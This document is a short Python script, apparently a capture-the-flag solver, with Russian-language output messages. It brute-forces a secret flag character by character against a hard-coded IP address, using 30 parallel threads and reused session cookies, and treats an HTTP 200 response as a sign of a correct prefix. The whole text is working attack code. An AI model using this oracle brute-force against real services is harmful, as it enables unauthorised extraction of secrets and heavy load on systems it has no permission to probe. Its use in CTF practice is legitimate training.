import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://62.173.140.174:16094/{}"

headers = {
    "User-Agent": "Mozilla/5.0",
}

cookies = {
    "session": "eyJ1c2VyX2lkIjoyfQ.abb7rw.bSqXdVpRXUW4T5REYQBbpkcHboc",
    "PHPSESSID": "4cba8b4b589c79c74ad3a62d358fd960"
}

alphabet = string.ascii_letters + string.digits + "_{}"

def check(payload):
    try:
        r = requests.get(BASE_URL.format(payload), headers=headers, cookies=cookies, timeout=5)
        return payload, r.status_code
    except:
        return payload, None


def brute_flag():
    flag = ""

    while True:
        found = False

        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(check, flag + c) for c in alphabet]

            for future in as_completed(futures):
                payload, status = future.result()

                if status == 200:
                    next_char = payload[len(flag)]
                    flag += next_char
                    print(f"[+] FLAG NOW: {flag}")
                    found = True
                    break

        if not found:
            print("[!] Символ больше не найден")
            break

        if flag.endswith("}"):
            print("[+] Флаг найден:", flag)
            break


if __name__ == "__main__":
    brute_flag()
